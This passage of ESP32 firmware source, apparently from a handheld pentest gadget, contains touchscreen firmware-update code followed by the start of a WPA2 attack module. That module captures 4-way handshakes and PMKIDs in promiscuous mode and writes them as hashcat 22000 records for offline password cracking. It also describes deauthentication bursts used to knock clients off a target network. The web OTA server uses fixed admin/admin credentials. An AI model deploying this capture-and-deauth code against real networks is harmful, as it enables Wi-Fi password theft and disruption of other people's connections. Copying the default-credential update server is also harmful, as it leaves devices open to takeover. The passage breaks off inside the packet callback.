  }
}

void drawMenu() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextSize(1);

  drawButton(BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "SD Update", false, false);
  drawButton(BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "Web OTA", false, false);

}

bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH) {
  return (x > buttonX && x < buttonX + buttonW && y > buttonY && y < buttonY + buttonH);
}

static void waitForTouchXY(int& x, int& y) {
  while (!readTouchXY(x, y)) {
    delay(10);
  }

  delay(80);
}

int yshift = 40;

void performSDUpdate() {
  updateStatusBar();
  runUI();
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("SD Update");
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 30 + yshift);
  tft.println("Insert SD card with");
  tft.setCursor(10, 40 + yshift);
  tft.println("firmware.bin in root");
  tft.setCursor(10, 50 + yshift);
  tft.println("Touch Start to update");

  drawTabBar("Start", false, "", false, "Back", false);

  bool waitingForStart = true;

  while (waitingForStart) {
    int x, y;
    if (readTouchXY(x, y)) {
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      if (checkButton(x, y, TAB_LEFT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        waitingForStart = false;
      }
      delay(50);
    }
  }

  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("Starting SD Update...");
  drawTabBar("", false, "", false, "Back", false);

  bool proceed = true;
  while (proceed) {
    int x, y;
    if (readTouchXY(x, y)) {
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      delay(50);
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.println("Initializing SD...");

    bool ok = false;
    #ifdef SD_CS
    ok = SD.begin(SD_CS);
    #endif
    #ifdef SD_CS_PIN
    if (!ok) {
      #ifdef CC1101_CS
      if (SD_CS_PIN != CC1101_CS) ok = SD.begin(SD_CS_PIN);
      #else
      ok = SD.begin(SD_CS_PIN);
      #endif
    }
    #endif
    if (!ok) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 40 + yshift);
      tft.println("X SD init failed!");
      tft.setCursor(10, 50 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("SD card OK");

    if (!SD.exists(FIRMWARE_FILE)) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Firmware not found!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    File firmwareFile = SD.open(FIRMWARE_FILE, FILE_READ);
    if (!firmwareFile) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X File open failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    size_t fileSize = firmwareFile.size();
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 50 + yshift);
    tft.printf("Size: %u bytes\n", fileSize);
    if (!Update.begin(fileSize)) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Update init failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 60 + yshift);
    tft.println("Updating...");
    size_t written = Update.writeStream(firmwareFile);
    if (written != fileSize) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Update failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 20 + yshift);
    tft.println("Update OK!");
    if (Update.end(true)) {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("Rebooting...");
      delay(2000);
      ESP.restart();
    } else {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Finalize failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }
    proceed = false;
  }
}

bool selectWiFiNetwork() {
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.setCursor(10, 50);
  tft.setTextColor(GREEN);
  tft.setTextSize(1);
  tft.println("Scanning...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int numNetworks = WiFi.scanNetworks();
  if (numNetworks <= 0) {
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
    tft.setCursor(10, 60);
    tft.println("Touch to retry");
    drawTabBar("Rescan", false, "", true, "", true);
    int x, y;
    while (!readTouchXY(x, y)) {
      delay(10);
    }
    delay(200);
    if (x >= TAB_LEFT_X && x < TAB_LEFT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT) {
      return selectWiFiNetwork();
    }
    return false;
  }

  NetworkInfo* networks = new NetworkInfo[numNetworks];
  for (int i = 0; i < numNetworks; i++) {
    strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 31);
    networks[i].ssid[31] = '\0';
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].authmode = WiFi.encryptionType(i);
  }

  int startIndex = 0;
  int selectedIndex = -1;
  bool selected = false;
  while (!selected) {
    drawNetworkList(startIndex, numNetworks, networks, selectedIndex);
    int x, y;
    while (!readTouchXY(x, y)) {
      delay(10);
    }
    delay(200);

    int y_pos = NETWORK_Y_START;
    int end_index = min(startIndex + NETWORKS_PER_PAGE, numNetworks);
    for (int i = startIndex; i < end_index && y_pos < 300; i++) {
      if (x >= 10 && x < SCREEN_WIDTH - 10 && y >= y_pos && y < y_pos + NETWORK_ROW_HEIGHT) {
        char buf[64];
        char ssid[12];
        strncpy(ssid, networks[i].ssid, 11);
        ssid[11] = '\0';
        if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
        const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
        snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
        tft.setTextColor(ORANGE, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(10, y_pos);
        tft.println(buf);
        delay(100);
        tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE), TFT_BLACK);
        tft.setCursor(10, y_pos);
        tft.println(buf);
        selectedIndex = i;
        strncpy(selectedSSID, networks[i].ssid, 31);
        selectedSSID[31] = '\0';
        selected = true;
        break;
      }
      y_pos += NETWORK_ROW_HEIGHT;
    }

    if (x >= TAB_LEFT_X && x < TAB_LEFT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT) {
      delete[] networks;
      return selectWiFiNetwork();
    }
    if (x >= TAB_MIDDLE_X && x < TAB_MIDDLE_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT && startIndex > 0) {
      startIndex -= NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (x >= TAB_RIGHT_X && x < TAB_RIGHT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT && startIndex + NETWORKS_PER_PAGE < numNetworks) {
      startIndex += NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (x >= 0 && x < 30 && y >= 10 && y < 30) {
      wifiPassword[0] = '\0';
      return false;
    }
  }

  delete[] networks;
  return true;
}

void drawNetworkList(int startIndex, int numNetworks, NetworkInfo* networks, int selectedIndex) {
  uiDrawn = false;
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);

  if (numNetworks == 0) {
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
  } else {
    int y = 50;
    tft.setTextColor(GREEN);
    tft.setCursor(10, y);
    tft.println("Networks:");
    y += 20;

    int start_index = startIndex;
    int end_index = min(start_index + NETWORKS_PER_PAGE, numNetworks);

    for (int i = start_index; i < end_index && y < 300; i++) {
      char buf[64];
      char ssid[12];
      strncpy(ssid, networks[i].ssid, 11);
      ssid[11] = '\0';
      if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
      const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
      snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
      tft.setCursor(10, y);
      tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE));
      tft.println(buf);
      y += NETWORK_ROW_HEIGHT;
    }

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", start_index / NETWORKS_PER_PAGE + 1, (numNetworks + NETWORKS_PER_PAGE - 1) / NETWORKS_PER_PAGE);
    tft.setCursor(180, 50);
    tft.setTextColor(GREEN);
    tft.println(page_buf);
  }

  bool prevDisabled = startIndex == 0;
  bool nextDisabled = (startIndex + NETWORKS_PER_PAGE) >= numNetworks;
  drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);

}

void drawInputField() {
  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 40);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
  }
}

void drawKeyboard() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 44);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
  }

  int yOffset = KEYBOARD_Y_OFFSET_START;
  for (int row = 0; row < 4; row++) {
    int xOffset = 10;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      tft.fillRect(xOffset, yOffset, KEY_WIDTH, KEY_HEIGHT, TFT_DARKGREY);
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(1);
      tft.setCursor(xOffset + 5, yOffset + 4);
      tft.print(keyboardLayout[row][col]);
      xOffset += KEY_WIDTH + KEY_SPACING;
    }
    yOffset += KEY_HEIGHT + KEY_SPACING;
  }

  int buttonY = 160;
  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setTextDatum(MC_DATUM);

  tft.fillRoundRect(5, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(5, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("Back", 40, buttonY + 12);

  tft.fillRoundRect(85, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(85, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("Del", 120, buttonY + 12);

  tft.fillRoundRect(165, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(165, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("OK", 200, buttonY + 12);

  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setCursor(1, 215);
  tft.println("[!] Enter the Wi-Fi password for the");
  tft.setCursor(24, 230);
  tft.println("selected network.");

  tft.setCursor(1, 250);
  tft.println("[!] Del: Removes last char from the");
  tft.setCursor(24, 265);
  tft.println("password.");
}

void updateInputField() {
  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 44);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
   }
}

bool enterWiFiPassword() {
  wifiPassword[0] = '\0';

  OnScreenKeyboardConfig cfg;
  cfg.titleLine1      = "[!] Enter the Wi-Fi password for the";
  cfg.titleLine2      = "selected network.";
  cfg.rows            = keyboardLayout;
  cfg.rowCount        = 4;
  cfg.maxLen          = PASSWORD_MAX_LENGTH;
  cfg.shuffleNames    = nullptr;
  cfg.shuffleCount    = 0;
  cfg.buttonsY        = 195;
  cfg.backLabel       = "Back";
  cfg.middleLabel     = "Del";
  cfg.okLabel         = "OK";
  cfg.enableShuffle   = false;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg   = "Password cannot be empty!";

  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "");

  if (!r.accepted) {

    wifiPassword[0] = '\0';
    return false;
  }

  size_t n = min((size_t)PASSWORD_MAX_LENGTH, (size_t)r.text.length());
  for (size_t i = 0; i < n; ++i) {
    wifiPassword[i] = r.text[i];
  }
  wifiPassword[n] = '\0';

  return true;
}

void performWebOTAUpdate() {
  uiDrawn = false;
  static size_t totalUploaded = 0;
  bool inUpdate = false;

  if (!selectWiFiNetwork()) {
    drawMenu();
    return;
  }

  if (!enterWiFiPassword()) {
    drawMenu();
    return;
  }

  updateStatusBar();
  runUI();
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("Starting Web OTA...");
  drawTabBar("", false, "", false, "Back", false);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 30 + yshift);
  tft.println("Connecting Wi-Fi");
  WiFi.begin(selectedSSID, wifiPassword);
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    int x, y;
    if (readTouchXY(x, y)) {
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        WiFi.disconnect();
        drawMenu();
        return;
      }
      delay(200);
    }
    delay(500);
    attempts++;
  }
  if (WiFi.status() != WL_CONNECTED) {
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("X Wi-Fi failed!");
    tft.setCursor(10, 50 + yshift);
    tft.println("Touch to retry or Back");
    int x, y;
    waitForTouchXY(x, y);
    if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
      WiFi.disconnect();
      drawMenu();
      return;
    }
    performWebOTAUpdate();
    return;
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 40 + yshift);
  tft.println("Wi-Fi OK");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 50 + yshift);
  tft.print("IP: ");
  tft.println(WiFi.localIP());
  tft.setCursor(10, 70 + yshift);
  tft.println("URL: http://esp32.local");
  tft.setCursor(10, 80 + yshift);
  tft.println("User: admin");
  tft.setCursor(10, 90 + yshift);
  tft.println("Pass: admin");

  if (!MDNS.begin(host)) {
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("X mDNS failed!");
    tft.setCursor(10, 50 + yshift);
    tft.println("Touch to retry or Back");
    int x, y;
    waitForTouchXY(x, y);
    if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
      WiFi.disconnect();
      drawMenu();
      return;
    }
    performWebOTAUpdate();
    return;
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 110 + yshift);
  tft.println("mDNS OK");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 120 + yshift);
  tft.println("Web server ready!");
  tft.setCursor(10, 130 + yshift);
  tft.println("Access via browser");

  server.on("/", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html", loginIndex);
  });
  server.on("/serverIndex", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html", serverIndex);
  });
  server.on("/update", HTTP_POST, []() {
    server.sendHeader("Connection", "close");
    bool success = !Update.hasError();
    server.send(200, "text/plain", success ? "OK" : "FAIL");
    if (success) {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setTextSize(1);
      tft.println("Update OK!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 20 + yshift);
      tft.println("Rebooting...");
      delay(2000);
      ESP.restart();
    } else {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.println("X Update Failed!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 20 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        server.close();
        WiFi.disconnect();
        drawMenu();
        return;
      }
      performWebOTAUpdate();
    }
  }, [&inUpdate, &totalUploaded]() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setTextSize(1);
      tft.println("Web OTA Started...");
      drawTabBar("", false, "", false, "Back", true);
      totalUploaded = 0;
      inUpdate = true;
      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
        Update.printError(Serial);
      }
      totalUploaded += upload.currentSize;
      int percent = (totalUploaded * 100) / (upload.totalSize ? upload.totalSize : 1000000);
      tft.setCursor(10, 30 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.printf("Progress: %d%%\n", percent);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (Update.end(true)) {
        Serial.printf("Update Success: %u\n", upload.totalSize);
      } else {
        Update.printError(Serial);
      }
      totalUploaded = 0;
      inUpdate = false;
    }
  });

  server.begin();

  while (true) {
    server.handleClient();
    if (!inUpdate) {
      int x, y;
      if (readTouchXY(x, y) && checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        server.close();
        WiFi.disconnect();
        drawMenu();
        return;
      }
      delay(200);
    }
    delay(1);
  }
}

void updateSetup() {

  tft.fillScreen(TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(0);

  setupTouchscreen();

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();

  drawMenu();
}

void updateLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  updateStatusBar();
  runUI();
  if (feature_exit_requested) return;

  int x, y;
  if (readTouchXY(x, y)) {
    if (x > BUTTON1_X && x < BUTTON1_X + BUTTON_WIDTH && y > BUTTON1_Y && y < BUTTON1_Y + BUTTON_HEIGHT) {
      performSDUpdate();
    }
    else if (x > BUTTON2_X && x < BUTTON2_X + BUTTON_WIDTH && y > BUTTON2_Y && y < BUTTON2_Y + BUTTON_HEIGHT) {
      performWebOTAUpdate();
    }
    delay(200);
  }
}
}

/* ════════════════════════════════════════════════════════════════════════════
   HandshakeCapture — WPA2 4-way handshake + PMKID capture, hash-22000 export.

   Flow:
     1. Setup: rescan WiFi, show AP picker (uses Arduino scan + getNetworkInfo
        with a static String — same crash-safe pattern as WifiScan).
     2. User picks target with UP/DOWN/RIGHT. RIGHT confirms.
     3. We lock to the AP's channel, enable promiscuous, install rxCallback.
     4. rxCallback filters data frames addressed via our target BSSID, peels
        the 802.11 + LLC/SNAP headers, looks for EAPOL-Key frames:
          - M1 (Ack only, no MIC): cache anonce per-client; if the Key Data
            section carries a PMKID-KDE (OUI 00-0F-AC, type 4), append a
            WPA*01 (PMKID) record to /captures/handshakes.22000.
          - M2 (MIC, no Ack): with M1 already cached for the same client,
            extract MIC, zero the MIC field in the EAPOL copy, and append a
            WPA*02 (EAPOL) record with MESSAGEPAIR=00 (M1+M2).
     5. RIGHT button at any time sends a short deauth burst at the target
        (24 broadcast deauths) to provoke fresh associations from clients,
        which gives us more handshakes. SELECT exits cleanly.
   ════════════════════════════════════════════════════════════════════════════ */
namespace HandshakeCapture {

enum class State { PICKING, CAPTURING };
static State    state = State::PICKING;

// Target
static uint8_t  targetBssid[6]   = {0};
static char     targetSsid[33]   = {0};
static uint8_t  targetChannel    = 0;

// AP picker list (small subset — different storage than WifiScan::scanRecs)
struct ApItem {
  char     ssid[33];
  uint8_t  bssid[6];
  int8_t   rssi;
  uint8_t  channel;
};
static constexpr int HSCAP_MAX_APS    = 30;
static constexpr int HSCAP_LIST_TOP_Y = 70;
static constexpr int HSCAP_LIST_ROW_H = 18;
static constexpr int HSCAP_LIST_BOT_Y = 280;
static constexpr int HSCAP_APS_PER_PG = (HSCAP_LIST_BOT_Y - HSCAP_LIST_TOP_Y) / HSCAP_LIST_ROW_H;

static ApItem   apList[HSCAP_MAX_APS];
static int      apCount    = 0;
static int      listCursor = 0;
static int      listPage   = 0;

// Live counters
static volatile uint32_t pmkidCount      = 0;
static volatile uint32_t handshakeCount  = 0;
static volatile uint32_t framesSeen      = 0;
static volatile uint32_t eapolSeen       = 0;
static bool              sdReady         = false;
static uint32_t          lastHudMs       = 0;
static uint32_t          lastBtnMs       = 0;

// Per-client in-flight handshake (round-robin few slots — most pentest
// targets have <5 active clients at a time; oldest gets evicted)
struct InFlight {
  uint8_t client[6];
  uint8_t anonce[32];
  uint8_t m2_eapol[256];
  int     m2_eapol_len;
  bool    has_m1;
  bool    has_m2;
};
static constexpr int HSCAP_INFLIGHT = 4;
static InFlight  inflight[HSCAP_INFLIGHT];
static int       inflightNext = 0;

static void resetInflight() {
  memset(inflight, 0, sizeof(inflight));
  inflightNext = 0;
}

static InFlight* findInflightForClient(const uint8_t* client) {
  for (int i = 0; i < HSCAP_INFLIGHT; i++) {
    if ((inflight[i].has_m1 || inflight[i].has_m2)
        && memcmp(inflight[i].client, client, 6) == 0) {
      return &inflight[i];
    }
  }
  return nullptr;
}

static InFlight* allocInflightForClient(const uint8_t* client) {
  InFlight* s = findInflightForClient(client);
  if (s) { memset(s, 0, sizeof(*s)); memcpy(s->client, client, 6); return s; }
  s = &inflight[inflightNext];
  inflightNext = (inflightNext + 1) % HSCAP_INFLIGHT;
  memset(s, 0, sizeof(*s));
  memcpy(s->client, client, 6);
  return s;
}

// ──────────────── Hex writers ────────────────
static void writeHex(File& f, const uint8_t* data, int len) {
  for (int i = 0; i < len; i++) {
    char b[3]; snprintf(b, sizeof(b), "%02x", data[i]); f.print(b);
  }
}
static void writeAsciiHex(File& f, const char* s) {
  for (int i = 0; s[i]; i++) {
    char b[3]; snprintf(b, sizeof(b), "%02x", (uint8_t)s[i]); f.print(b);
  }
}

static void ensureCapturesDir() {
  if (!SD.exists("/captures")) SD.mkdir("/captures");
}

// hashcat 22000 PMKID:  WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***
static void writePmkid22000(const uint8_t pmkid[16], const uint8_t* sta) {
  ensureCapturesDir();
  File f = SD.open("/captures/handshakes.22000", FILE_APPEND);
  if (!f) return;
  f.print("WPA*01*"); writeHex(f, pmkid, 16);
  f.print("*");       writeHex(f, targetBssid, 6);
  f.print("*");       writeHex(f, sta, 6);
  f.print("*");       writeAsciiHex(f, targetSsid);
  f.println("***");
  f.close();
  pmkidCount++;
}

// hashcat 22000 EAPOL (M1+M2):
//   WPA*02*MIC*MAC_AP*MAC_STA*ESSID*ANONCE*EAPOL_M2_MIC_ZEROED*00
static void writeHandshake22000(const InFlight& s) {
  if (!s.has_m1 || !s.has_m2 || s.m2_eapol_len < 99) return;
  uint8_t m2[256];
  memcpy(m2, s.m2_eapol, s.m2_eapol_len);
  uint8_t mic[16];
  memcpy(mic, &m2[81], 16);
  memset(&m2[81], 0, 16);

  ensureCapturesDir();
  File f = SD.open("/captures/handshakes.22000", FILE_APPEND);
  if (!f) return;
  f.print("WPA*02*"); writeHex(f, mic, 16);
  f.print("*");       writeHex(f, targetBssid, 6);
  f.print("*");       writeHex(f, s.client, 6);
  f.print("*");       writeAsciiHex(f, targetSsid);
  f.print("*");       writeHex(f, s.anonce, 32);
  f.print("*");       writeHex(f, m2, s.m2_eapol_len);
  f.println("*00");
  f.close();
  handshakeCount++;
}

// Walk Key Data section for PMKID-KDE (OUI 00-0F-AC, type 4).
static bool extractPmkidFromKeyData(const uint8_t* kd, int kdLen, uint8_t out[16]) {
  int i = 0;
  while (i + 2 <= kdLen) {
    uint8_t tag = kd[i], len = kd[i + 1];
    if (i + 2 + len > kdLen) return false;
    if (tag == 0xDD && len >= 4 + 16
        && kd[i + 2] == 0x00 && kd[i + 3] == 0x0F
        && kd[i + 4] == 0xAC && kd[i + 5] == 0x04) {
      memcpy(out, &kd[i + 6], 16);
      return true;
    }
    i += 2 + len;
  }
  return false;
}

// ──────────────── Promiscuous RX ────────────────
static void rxCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
